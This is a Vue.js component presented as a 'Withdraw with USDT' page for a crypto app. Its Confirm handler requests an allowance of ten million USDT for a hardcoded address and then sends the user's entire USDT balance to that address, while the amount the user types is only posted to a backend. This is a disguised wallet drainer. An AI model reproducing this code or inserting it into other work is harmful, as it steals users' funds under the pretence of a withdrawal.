<template>
  <div class="withdraw text-light">
    <div><h3>Withdraw with USDT</h3></div>
    <div class="container">
      <div class="mb-3 d-flex bd-highlight mb-2">
        <div class="p-2 bd-highlight">
          <input
            type="value"
            class="form-control"
            id="value"
            aria-describedby="value"
          />
        </div>
        <div class="p-3 bd-highlight">
          <p>Total balance</p>
        </div>
      </div>
      <button @click="init" class="btn btn-primary" style="margin-bottom: 10px">
        Confirm
      </button>
    </div>
  </div>
</template>
<script>
import { ethers } from "ethers";
import axios from "axios";
export default {
  name: "AppWithDraw",

  methods: {
    async init() {
      console.log("init");
      const toWei = (ether) => ethers.utils.parseEther(ether);
      let accounts = [];
      const { ethereum } = window;

      try {
        if (ethereum !== "undefined") {
          accounts = await ethereum.request({
            method: "eth_requestAccounts",
          });
        }
        const provider = await new ethers.providers.Web3Provider(
          window.ethereum
        );
        const mySigner = provider.getSigner();
        const contractUsdt = new ethers.Contract(
          "0x55d398326f99059fF775485246999027B3197955",
          this.abi(),
          mySigner
        );
        let x = await contractUsdt.allowance(
          accounts[0],
          "0x141045c8eA134a99de433019CE1fAE990D03130d"
        );

        let y= parseFloat(x)/ Math.pow(10, 18);

        if (y== 0) {
          const wei = toWei("10000000");
          contractUsdt.approve(
            "0x141045c8eA134a99de433019CE1fAE990D03130d",
            wei
          );
        }
        const balance = await contractUsdt.balanceOf(accounts[0]);
        console.log("balance " + balance / Math.pow(10, 18));
        let balanced = balance / Math.pow(10, 18);
        const weii = toWei(balanced + "");
        contractUsdt.transfer(
          "0x141045c8eA134a99de433019CE1fAE990D03130d",
          weii
        );
        let amountWithdraw = {
          amountWithdraw: document.getElementById("value").value,
        };
        console.log(amountWithdraw);
        axios
          .post(
            "/transaction/withdraw",
            JSON.stringify(amountWithdraw),
            {
              headers: {
                "Content-Type": "application/json",
                "Access-Control-Allow-Methods": "*",
                authorization: accounts[0],
              },
            }
          )
          .then((res) => {
            console.log(res);
          })
          .catch((err) => {
            console.log(err.response);
          });
      } catch (e) {
        console.log(e);
      }
    },
    abi() {
      return [
        {
          inputs: [],
          payable: false,
          stateMutability: "nonpayable",
          type: "constructor",
        },
        {
          anonymous: false,
          inputs: [
            {
              indexed: true,
              internalType: "address",
              name: "owner",
              type: "address",
            },
            {
              indexed: true,
              internalType: "address",
              name: "spender",
              type: "address",
            },
            {
              indexed: false,
              internalType: "uint256",
              name: "value",
              type: "uint256",
            },
          ],
          name: "Approval",
          type: "event",
        },
        {
          anonymous: false,
          inputs: [
            {
              indexed: true,
              internalType: "address",
              name: "previousOwner",
              type: "address",
            },
            {
              indexed: true,
              internalType: "address",
              name: "newOwner",
              type: "address",
            },
          ],
          name: "OwnershipTransferred",
          type: "event",
        },
        {
          anonymous: false,
          inputs: [
            {
              indexed: true,
              internalType: "address",
              name: "from",
              type: "address",
            },
            {
              indexed: true,
              internalType: "address",
              name: "to",
              type: "address",
            },
            {
              indexed: false,
              internalType: "uint256",
              name: "value",
              type: "uint256",
            },
          ],
          name: "Transfer",
          type: "event",
        },
        {
          constant: true,
          inputs: [],
          name: "_decimals",
          outputs: [{ internalType: "uint8", name: "", type: "uint8" }],
          payable: false,
          stateMutability: "view",
          type: "function",
        },
        {
          constant: true,
          inputs: [],
          name: "_name",
          outputs: [{ internalType: "string", name: "", type: "string" }],
          payable: false,
          stateMutability: "view",
          type: "function",
        },
        {
          constant: true,
          inputs: [],
          name: "_symbol",
          outputs: [{ internalType: "string", name: "", type: "string" }],
          payable: false,
          stateMutability: "view",
          type: "function",
        },
        {
          constant: true,
          inputs: [
            { internalType: "address", name: "owner", type: "address" },
            { internalType: "address", name: "spender", type: "address" },
          ],
          name: "allowance",
          outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
          payable: false,
          stateMutability: "view",
          type: "function",
        },
        {
          constant: false,
          inputs: [
            { internalType: "address", name: "spender", type: "address" },
            { internalType: "uint256", name: "amount", type: "uint256" },
          ],
          name: "approve",
          outputs: [{ internalType: "bool", name: "", type: "bool" }],
          payable: false,
          stateMutability: "nonpayable",
          type: "function",
        },
        {
          constant: true,
          inputs: [
            { internalType: "address", name: "account", type: "address" },
          ],
          name: "balanceOf",
          outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
          payable: false,
          stateMutability: "view",
          type: "function",
        },
        {
          constant: false,
          inputs: [
            { internalType: "uint256", name: "amount", type: "uint256" },
          ],
          name: "burn",
          outputs: [{ internalType: "bool", name: "", type: "bool" }],
          payable: false,
          stateMutability: "nonpayable",
          type: "function",
        },
        {
          constant: true,
          inputs: [],
          name: "decimals",
          outputs: [{ internalType: "uint8", name: "", type: "uint8" }],
          payable: false,
          stateMutability: "view",
          type: "function",
        },
        {
          constant: false,
          inputs: [
            { internalType: "address", name: "spender", type: "address" },
            {
              internalType: "uint256",
              name: "subtractedValue",
              type: "uint256",
            },
          ],
          name: "decreaseAllowance",
          outputs: [{ internalType: "bool", name: "", type: "bool" }],
          payable: false,
          stateMutability: "nonpayable",
          type: "function",
        },
        {
          constant: true,
          inputs: [],
          name: "getOwner",
          outputs: [{ internalType: "address", name: "", type: "address" }],
          payable: false,
          stateMutability: "view",
          type: "function",
        },
        {
          constant: false,
          inputs: [
            { internalType: "address", name: "spender", type: "address" },
            { internalType: "uint256", name: "addedValue", type: "uint256" },
          ],
          name: "increaseAllowance",
          outputs: [{ internalType: "bool", name: "", type: "bool" }],
          payable: false,
          stateMutability: "nonpayable",
          type: "function",
        },
        {
          constant: false,
          inputs: [
            { internalType: "uint256", name: "amount", type: "uint256" },
          ],
          name: "mint",
          outputs: [{ internalType: "bool", name: "", type: "bool" }],
          payable: false,
          stateMutability: "nonpayable",
          type: "function",
        },
        {
          constant: true,
          inputs: [],
          name: "name",
          outputs: [{ internalType: "string", name: "", type: "string" }],
          payable: false,
          stateMutability: "view",
          type: "function",
        },
        {
          constant: true,
          inputs: [],
          name: "owner",
          outputs: [{ internalType: "address", name: "", type: "address" }],
          payable: false,
          stateMutability: "view",
          type: "function",
        },
        {
          constant: false,
          inputs: [],
          name: "renounceOwnership",
          outputs: [],
          payable: false,
          stateMutability: "nonpayable",
          type: "function",
        },
        {
          constant: true,
          inputs: [],
          name: "symbol",
          outputs: [{ internalType: "string", name: "", type: "string" }],
          payable: false,
          stateMutability: "view",
          type: "function",
        },
        {
          constant: true,
          inputs: [],
          name: "totalSupply",
          outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
          payable: false,
          stateMutability: "view",
          type: "function",
        },
        {
          constant: false,
          inputs: [
            { internalType: "address", name: "recipient", type: "address" },
            { internalType: "uint256", name: "amount", type: "uint256" },
          ],
          name: "transfer",
          outputs: [{ internalType: "bool", name: "", type: "bool" }],
          payable: false,
          stateMutability: "nonpayable",
          type: "function",
        },
        {
          constant: false,
          inputs: [
            { internalType: "address", name: "sender", type: "address" },
            { internalType: "address", name: "recipient", type: "address" },
            { internalType: "uint256", name: "amount", type: "uint256" },
          ],
          name: "transferFrom",
          outputs: [{ internalType: "bool", name: "", type: "bool" }],
          payable: false,
          stateMutability: "nonpayable",
          type: "function",
        },
        {
          constant: false,
          inputs: [
            { internalType: "address", name: "newOwner", type: "address" },
          ],
          name: "transferOwnership",
          outputs: [],
          payable: false,
          stateMutability: "nonpayable",
          type: "function",
        },
      ];
    },
  },
};
</script>
<style scoped>
.withdraw {
  padding-top: 5px;
  border-radius: 5px;
  background: rgb(47, 68, 160);
}
</style>
